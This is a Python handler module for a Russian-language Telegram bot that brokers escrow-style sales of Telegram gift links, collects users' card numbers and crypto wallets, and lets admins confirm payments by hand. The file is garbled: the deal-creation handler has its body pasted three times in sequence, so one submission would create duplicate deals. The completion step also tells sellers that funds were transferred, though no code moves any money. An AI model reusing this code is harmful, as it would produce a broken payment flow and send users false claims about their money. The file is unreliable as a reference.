from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

import database as db
from texts import t
from keyboards import (
    main_menu_kb, back_kb, back_cancel_kb, payment_method_kb,
    join_deal_kb, confirm_gift_kb, language_kb, credentials_kb,
    admin_main_kb, admin_deals_kb
)

router = Router()
MAIN_ADMIN_ID = 5461944251


# ================= FSM СОСТОЯНИЯ =================

class CreateDeal(StatesGroup):
    waiting_for_link = State()
    waiting_for_payment = State()
    waiting_for_amount = State()
    waiting_for_details = State()


class EditCredentials(StatesGroup):
    editing_stars = State()
    editing_card = State()
    editing_usdt = State()
    editing_ton = State()


class AdminAdd(StatesGroup):
    waiting_for_id = State()
    waiting_for_remove_id = State()


# ================= ВСПОМОГАТЕЛЬНЫЕ =================

async def send_main_menu(message_or_call, user_id: int, edit: bool = False):
    """Отправка главного меню пользователю БЕЗ повторных попыток."""
    user = await db.get_user(user_id)
    lang = user["language"]
    is_admin = bool(user["is_admin"])
    text = t(lang, "welcome")
    kb = main_menu_kb(lang, is_admin)
    
    if edit and hasattr(message_or_call, "edit_text"):
        await message_or_call.edit_text(text, reply_markup=kb)
    elif hasattr(message_or_call, "message"):
        await message_or_call.message.answer(text, reply_markup=kb)
    else:
        await message_or_call.answer(text, reply_markup=kb)


# ================= СТАРТ =================

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]

    args = message.text.split(" ", 1) if message.text else []
    if len(args) > 1 and args[1].startswith("ALX"):
        deal_number = args[1]
        deal = await db.get_deal_by_number(deal_number)
        if deal and deal["status"] == "waiting_for_buyer":
            text = t(
                lang, "buyer_welcome",
                gift_link=deal["gift_link"],
                amount=deal["amount"],
                currency=deal["currency"],
                seller_username=deal["seller_username"] or "unknown"
            )
            await message.answer(text, reply_markup=join_deal_kb(deal_number, lang))
            return

    await send_main_menu(message, message.from_user.id)


# ================= СОЗДАНИЕ СДЕЛКИ =================

@router.callback_query(F.data == "create_deal")
async def create_deal_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "send_gift_link"), reply_markup=back_kb(lang))
    await state.set_state(CreateDeal.waiting_for_link)
    await call.answer()


@router.message(CreateDeal.waiting_for_link)
async def process_gift_link(message: Message, state: FSMContext):
    link = message.text.strip()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]

    if not link.startswith("https://t.me/"):
        await message.answer(t(lang, "invalid_link"))
        return

    await state.update_data(gift_link=link)
    await message.answer(t(lang, "choose_payment"), reply_markup=payment_method_kb(lang))
    await state.set_state(CreateDeal.waiting_for_payment)


@router.callback_query(CreateDeal.waiting_for_payment, F.data.startswith("pay_"))
async def choose_payment(call: CallbackQuery, state: FSMContext):
    currency = call.data.replace("pay_", "").upper()
    await state.update_data(currency=currency)
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_amount"), reply_markup=back_cancel_kb(lang))
    await state.set_state(CreateDeal.waiting_for_amount)
    await call.answer()


@router.message(CreateDeal.waiting_for_amount)
async def process_amount(message: Message, state: FSMContext):
    data = await state.get_data()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    
    # 🔒 Защита от потери state
    if "currency" not in data:
        await message.answer(
            "⚠️ Сессия истекла. Начните создание сделки заново.",
            reply_markup=back_kb(lang)
        )
        await state.clear()
        return

    try:
        amount = float(message.text.replace(",", "."))
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer(t(lang, "invalid_amount"))
        return

    await state.update_data(amount=amount)
    data = await state.get_data()
    currency = data["currency"]

    if currency == "RUB":
        await message.answer(t(lang, "enter_card"), reply_markup=back_cancel_kb(lang))
    elif currency == "STARS":
        await message.answer(t(lang, "enter_stars_username"), reply_markup=back_cancel_kb(lang))
    else:
        await message.answer(t(lang, "enter_crypto_wallet"), reply_markup=back_cancel_kb(lang))

    await state.set_state(CreateDeal.waiting_for_details)


@router.message(CreateDeal.waiting_for_details)
async def process_details(message: Message, state: FSMContext, bot: Bot):
    details = message.text.strip()
    data = await state.get_data()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    username = message.from_user.username or "user"

    # 🔒 ЗАЩИТА: проверяем, что все данные есть в state
    required_keys = ["gift_link", "amount", "currency"]
    missing_keys = [k for k in required_keys if k not in data]
    
    if missing_keys:
        print(f"[FSM] ⚠️ Недостающие ключи в state: {missing_keys} для user {message.from_user.id}")
        await message.answer(
            "⚠️ Сессия создания сделки истекла или была прервана.\n"
            "Пожалуйста, начните создание сделки заново.",
            reply_markup=back_kb(lang)
        )
        await state.clear()
        return

    # Создаём сделку в БД
    deal_number = await db.create_deal(
        seller_id=message.from_user.id,
        seller_username=username,
        gift_link=data["gift_link"],
        amount=data["amount"],
        currency=data["currency"],
        payment_details=details
    )

    # Пробуем создать инвойс в TryBit
    invoice_result = None
    payment_link = None
    
    try:
        from trybit import create_invoice, get_payment_link
        
        crypto_mapping = {
            "USDT": "USDT_TRC20",
            "TON": "TON",
            "RUB": None,
            "STARS": None,
            "USD": None
        }
        
        cryptocurrency = crypto_mapping.get(data["currency"])
        
        invoice_result = await create_invoice(
            amount=data["amount"],
            currency=data["currency"] if data["currency"] in ["USD", "RUB", "EUR", "GBP"] else "USD",
            order_id=deal_number,
            cryptocurrency=cryptocurrency,
            time_to_pay_hours=24
        )
        
        if invoice_result:
            payment_link = get_payment_link(invoice_result)
            print(f"[TryBit] ✅ Инвойс создан для сделки {deal_number}: {payment_link}")
    except Exception as e:
        print(f"[TryBit] ⚠️ Ошибка создания инвойса: {e}")

    # Формируем сообщение для пользователя
    bot_info = await bot.get_me()
    text = t(
        lang, "deal_created",
        deal_number=deal_number,
        gift_link=data["gift_link"],
        amount=data["amount"],
        currency=data["currency"],
        details=details,
        bot_username=bot_info.username
    )

    if payment_link:
        text += f"\n\n💳 <b>Ссылка для оплаты:</b>\n{payment_link}"
        text += f"\n\n⏳ Оплата доступна в течение 24 часов."
        text += f"\n🔄 После оплаты администратор подтвердит сделку."

    await message.answer(text, reply_markup=back_kb(lang))
    await state.clear()
    details = message.text.strip()
    data = await state.get_data()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    username = message.from_user.username or "user"

    # Создаём сделку в БД
    deal_number = await db.create_deal(
        seller_id=message.from_user.id,
        seller_username=username,
        gift_link=data["gift_link"],
        amount=data["amount"],
        currency=data["currency"],
        payment_details=details
    )

    # Пробуем создать инвойс в TryBit
    invoice_result = None
    payment_link = None
    
    try:
        from trybit import create_invoice, get_payment_link
        
        # Маппинг валют бота на валюты TryBit
        crypto_mapping = {
            "USDT": "USDT_TRC20",
            "TON": "TON",
            "RUB": None,  # фиат
            "STARS": None,  # фиат
            "USD": None  # фиат
        }
        
        cryptocurrency = crypto_mapping.get(data["currency"])
        
        invoice_result = await create_invoice(
            amount=data["amount"],
            currency=data["currency"] if data["currency"] in ["USD", "RUB", "EUR", "GBP"] else "USD",
            order_id=deal_number,
            cryptocurrency=cryptocurrency,
            time_to_pay_hours=24
        )
        
        if invoice_result:
            payment_link = get_payment_link(invoice_result)
            print(f"[TryBit] ✅ Инвойс создан для сделки {deal_number}: {payment_link}")
    except Exception as e:
        print(f"[TryBit] ⚠️ Ошибка создания инвойса: {e}")

    # Формируем сообщение для пользователя
    bot_info = await bot.get_me()
    text = t(
        lang, "deal_created",
        deal_number=deal_number,
        gift_link=data["gift_link"],
        amount=data["amount"],
        currency=data["currency"],
        details=details,
        bot_username=bot_info.username
    )

    # Добавляем ссылку на оплату, если инвойс создан
    if payment_link:
        text += f"\n\n💳 <b>Ссылка для оплаты:</b>\n{payment_link}"
        text += f"\n\n⏳ Оплата доступна в течение 24 часов."
        text += f"\n🔄 После оплаты администратор подтвердит сделку."

    # Кнопки для сделки
    kb = [
        [InlineKeyboardButton(text="📋 Мои сделки", callback_data="my_deals")],
        [InlineKeyboardButton(text=t(lang, "back"), callback_data="main_menu")]
    ]

    await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await state.clear()
    details = message.text.strip()
    data = await state.get_data()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    username = message.from_user.username or "user"

    deal_number = await db.create_deal(
        seller_id=message.from_user.id,
        seller_username=username,
        gift_link=data["gift_link"],
        amount=data["amount"],
        currency=data["currency"],
        payment_details=details
    )

    bot_info = await bot.get_me()
    text = t(
        lang, "deal_created",
        deal_number=deal_number,
        gift_link=data["gift_link"],
        amount=data["amount"],
        currency=data["currency"],
        details=details,
        bot_username=bot_info.username
    )

    await message.answer(text, reply_markup=back_kb(lang))
    await state.clear()


# ================= ПОКУПАТЕЛЬ ПРИСОЕДИНЯЕТСЯ =================

@router.callback_query(F.data.startswith("join:"))
async def buyer_join(call: CallbackQuery, bot: Bot):
    deal_number = call.data.split(":", 1)[1]
    deal = await db.get_deal_by_number(deal_number)

    if not deal:
        await call.answer("Сделка не найдена", show_alert=True)
        return

    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    username = call.from_user.username or "user"

    await db.join_deal(deal_number, call.from_user.id, username)

    seller = await db.get_user(deal["seller_id"])
    seller_lang = seller["language"]
    await bot.send_message(
        deal["seller_id"],
        t(
            seller_lang, "buyer_joined",
            buyer_username=username,
            successful_deals=seller["successful_deals"]
        )
    )

    admins = await db.get_admins()
    for admin in admins:
        try:
            await bot.send_message(
                admin["user_id"],
                f"👀 Новый покупатель @{username} в сделке {deal_number}\n🎁 {deal['gift_link']}"
            )
        except Exception:
            pass

    await call.message.edit_text(
        "✅ Вы присоединились к сделке.\n⏳ Ожидайте подтверждения оплаты администратором.",
        reply_markup=back_kb(lang)
    )
    await call.answer()


# ================= О СЕРВИСЕ (FAQ) =================

@router.callback_query(F.data == "about")
async def about(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "about_text"), reply_markup=back_kb(lang))
    await call.answer()


# ================= СМЕНА ЯЗЫКА =================

@router.callback_query(F.data == "change_lang")
async def change_lang(call: CallbackQuery):
    await call.message.edit_text(
        "🌐 Выберите язык / Choose language",
        reply_markup=language_kb()
    )
    await call.answer()


@router.callback_query(F.data.startswith("lang_"))
async def set_lang(call: CallbackQuery):
    lang = call.data.split("_", 1)[1]
    await db.update_user(call.from_user.id, language=lang)
    user = await db.get_user(call.from_user.id)
    is_admin = bool(user["is_admin"])
    await call.message.edit_text(
        t(lang, "language_changed"),
        reply_markup=back_kb(lang)
    )
    await call.answer()


# ================= РЕКВИЗИТЫ =================

@router.callback_query(F.data == "credentials")
async def credentials_menu(call: CallbackQuery, state: FSMContext):
    await state.clear()
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    text = t(
        lang, "credentials_menu",
        stars=user["stars_username"] or "—",
        card=user["card_number"] or "—",
        usdt=user["usdt_wallet"] or "—",
        ton=user["ton_wallet"] or "—"
    )
    await call.message.edit_text(text, reply_markup=credentials_kb(lang))
    await call.answer()


async def show_credentials(message, user_id: int):
    user = await db.get_user(user_id)
    lang = user["language"]
    text = t(
        lang, "credentials_menu",
        stars=user["stars_username"] or "—",
        card=user["card_number"] or "—",
        usdt=user["usdt_wallet"] or "—",
        ton=user["ton_wallet"] or "—"
    )
    await message.answer(text, reply_markup=credentials_kb(lang))


@router.callback_query(F.data == "edit_stars")
async def edit_stars_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_stars_username"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_stars)
    await call.answer()


@router.message(EditCredentials.editing_stars)
async def save_stars(message: Message, state: FSMContext):
    value = message.text.strip()
    await db.update_user(message.from_user.id, stars_username=value)
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(t(lang, "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


@router.callback_query(F.data == "edit_card")
async def edit_card_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_card"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_card)
    await call.answer()


@router.message(EditCredentials.editing_card)
async def save_card(message: Message, state: FSMContext):
    value = message.text.strip()
    await db.update_user(message.from_user.id, card_number=value)
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(t(lang, "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


@router.callback_query(F.data == "edit_usdt")
async def edit_usdt_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_crypto_wallet"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_usdt)
    await call.answer()


@router.message(EditCredentials.editing_usdt)
async def save_usdt(message: Message, state: FSMContext):
    value = message.text.strip()
    await db.update_user(message.from_user.id, usdt_wallet=value)
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(t(lang, "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


@router.callback_query(F.data == "edit_ton")
async def edit_ton_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_crypto_wallet"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_ton)
    await call.answer()


@router.message(EditCredentials.editing_ton)
async def save_ton(message: Message, state: FSMContext):
    value = message.text.strip()
    await db.update_user(message.from_user.id, ton_wallet=value)
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(t(lang, "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


# ================= АДМИН-ПАНЕЛЬ =================

@router.callback_query(F.data == "admin_panel")
async def admin_panel(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return
    lang = user["language"]
    await call.message.edit_text("⚙️ Админ панель", reply_markup=admin_main_kb(lang))
    await call.answer()


@router.callback_query(F.data == "admin_deals")
async def admin_deals_list(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return
    lang = user["language"]
    deals = await db.get_all_deals()

    header = t(lang, "admin_deals_list") + "\n\n"
    if not deals:
        deals_text = "📭 Сделок пока нет."
    else:
        deals_text = ""
        for d in deals[:20]:
            deals_text += (
                f"🆔 Номер: {d['deal_number']}\n"
                f"🎁 {d['gift_link']}\n"
                f"👤 @{d['seller_username'] or 'unknown'}\n\n"
            )

    await call.message.edit_text(header + deals_text, reply_markup=admin_deals_kb(deals, lang))
    await call.answer()


@router.callback_query(F.data.startswith("confirm_deal:"))
async def admin_confirm_deal(call: CallbackQuery, bot: Bot):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return

    deal_number = call.data.split(":", 1)[1]
    deal = await db.get_deal_by_number(deal_number)

    if not deal:
        await call.answer("❌ Сделка не найдена", show_alert=True)
        return

    if deal["buyer_id"] is None:
        await call.answer("❌ Покупатель ещё не присоединился к сделке", show_alert=True)
        return

    if deal["status"] in ["paid", "completed"]:
        await call.answer("✅ Сделка уже подтверждена или завершена", show_alert=True)
        return

    # Подтверждаем оплату
    await db.confirm_payment(deal_number)
    print(f"[ADMIN] Ручное подтверждение сделки {deal_number} админом {call.from_user.id}")

    # Уведомление продавцу
    try:
        await bot.send_message(
            deal["seller_id"],
            f"💸 Покупатель успешно произвел оплату!\n"
            f"🎁 Отправьте подарок: {deal['gift_link']}\n\n"
            f"⚠️ После отправки подарка дождитесь подтверждения от покупателя."
        )
    except Exception:
        pass

    # Уведомление покупателю
    try:
        await bot.send_message(
            deal["buyer_id"],
            f"💸 Оплата подтверждена!\n"
            f"🎁 Подарок: {deal['gift_link']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n\n"
            f"⏳ Ожидайте получение подарка от продавца.\n"
            f"Когда получите — нажмите кнопку ниже:",
            reply_markup=confirm_gift_kb("ru")
        )
    except Exception:
        pass

    # Уведомление другим админам
    admins = await db.get_admins()
    for admin in admins:
        if admin["user_id"] != call.from_user.id:
            try:
                await bot.send_message(
                    admin["user_id"],
                    f"🛠 Администратор @{call.from_user.username or call.from_user.id} "
                    f"подтвердил оплату по сделке #{deal_number}"
                )
            except Exception:
                pass

    await call.answer("✅ Оплата подтверждена вручную!")

    # ВАЖНО: эти строки ВНУТРИ функции (с отступом 4 пробела!)
    admin_lang = user["language"]
    await call.message.edit_text(
        f"✅ Сделка #{deal_number} подтверждена!\n\n"
        f"👤 Продавец: @{deal['seller_username']}\n"
        f"🛒 Покупатель: @{deal['buyer_username']}\n"
        f"🎁 Подарок: {deal['gift_link']}\n\n"
        f"📨 Уведомления отправлены обеим сторонам.",
        reply_markup=back_kb(admin_lang)
    )


# ================= ПОКУПАТЕЛЬ ПОДТВЕРЖДАЕТ ПОЛУЧЕНИЕ =================

@router.callback_query(F.data == "confirm_gift")
async def buyer_confirms_gift(call: CallbackQuery, bot: Bot):
    import aiosqlite
    async with aiosqlite.connect(db.DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM deals WHERE buyer_id=? AND status='paid'",
            (call.from_user.id,)
        ) as cur:
            row = await cur.fetchone()
            if not row:
                await call.answer("❌ Нет активной сделки", show_alert=True)
                return
            deal = dict(row)

    await db.complete_deal(deal["deal_number"])

    try:
        await bot.send_message(
            deal["seller_id"],
            "✅ Сделка завершена! Средства переведены."
        )
    except Exception:
        pass

    await call.message.edit_text("🎉 Сделка успешно завершена!")
    await call.answer()


# ================= ГЛАВНЫЙ АДМИН: ДОБАВИТЬ/УДАЛИТЬ АДМИНА =================

@router.callback_query(F.data == "admin_add")
async def admin_add_start(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != MAIN_ADMIN_ID:
        await call.answer("🚫 Только главный администратор", show_alert=True)
        return
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_admin_id"), reply_markup=back_cancel_kb(lang))
    await state.set_state(AdminAdd.waiting_for_id)
    await call.answer()


@router.message(AdminAdd.waiting_for_id)
async def admin_add_process(message: Message, state: FSMContext):
    if message.from_user.id != MAIN_ADMIN_ID:
        return
    try:
        admin_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Введите корректный числовой ID")
        return

    await db.add_admin(admin_id)
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(t(lang, "admin_added"))
    await state.clear()
    await message.answer("⚙️ Админ панель", reply_markup=admin_main_kb(lang))


@router.callback_query(F.data == "admin_remove")
async def admin_remove_start(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != MAIN_ADMIN_ID:
        await call.answer("🚫 Только главный администратор", show_alert=True)
        return
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_admin_remove_id"), reply_markup=back_cancel_kb(lang))
    await state.set_state(AdminAdd.waiting_for_remove_id)
    await call.answer()


@router.message(AdminAdd.waiting_for_remove_id)
async def admin_remove_process(message: Message, state: FSMContext):
    if message.from_user.id != MAIN_ADMIN_ID:
        return
    try:
        admin_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Введите корректный числовой ID")
        return

    if admin_id == MAIN_ADMIN_ID:
        await message.answer("🚫 Нельзя удалить главного администратора")
        return

    await db.remove_admin(admin_id)
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(t(lang, "admin_removed"))
    await state.clear()
    await message.answer("⚙️ Админ панель", reply_markup=admin_main_kb(lang))


@router.callback_query(F.data == "admin_list")
async def admin_list(call: CallbackQuery):
    if call.from_user.id != MAIN_ADMIN_ID:
        await call.answer("🚫 Только главный администратор", show_alert=True)
        return

    admins = await db.get_admins()
    text = "👥 Список администраторов:\n\n"
    for a in admins:
        text += f"🆔 {a['user_id']} — @{a['username'] or 'нет'}\n"

    await call.message.edit_text(text, reply_markup=back_kb("ru"))
    await call.answer()


# ================= ОТМЕНА СОСТОЯНИЯ =================

@router.callback_query(F.data == "cancel_state")
async def cancel_handler(call: CallbackQuery, state: FSMContext):
    await state.clear()
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "cancelled"), reply_markup=back_kb(lang))
    await call.answer()


@router.message()
async def unknown_message(message: Message):
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(
        t(lang, "welcome"),
        reply_markup=main_menu_kb(lang, bool(user["is_admin"]))
    )


@router.callback_query(F.data.startswith("deal_info:"))
async def deal_info(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return

    deal_number = call.data.split(":", 1)[1]
    deal = await db.get_deal_by_number(deal_number)

    if not deal:
        await call.answer("❌ Сделка не найдена", show_alert=True)
        return

    status_map = {
        "waiting_for_buyer": "🟡 Ожидает покупателя",
        "buyer_joined": "🔵 Покупатель присоединился",
        "paid": "✅ Оплачена",
        "completed": "🏁 Завершена"
    }

    text = (
        f"📋 Информация о сделке #{deal_number}\n\n"
        f"🎁 Подарок: {deal['gift_link']}\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"💳 Реквизиты: {deal['payment_details']}\n\n"
        f"👤 Продавец: @{deal['seller_username'] or 'unknown'} (ID: {deal['seller_id']})\n"
        f"🛒 Покупатель: @{deal['buyer_username'] or '—'} (ID: {deal['buyer_id'] or '—'})\n\n"
        f"📊 Статус: {status_map.get(deal['status'], deal['status'])}\n"
        f"📅 Создана: {deal['created_at'][:19]}"
    )

    kb = []
    if deal["buyer_id"] and deal["status"] not in ["paid", "completed"]:
        kb.append([InlineKeyboardButton(
            text="💸 Подтвердить оплату вручную",
            callback_data=f"confirm_deal:{deal_number}"
        )])
    kb.append([InlineKeyboardButton(text="◀️ К списку сделок", callback_data="admin_deals")])

    await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await call.answer()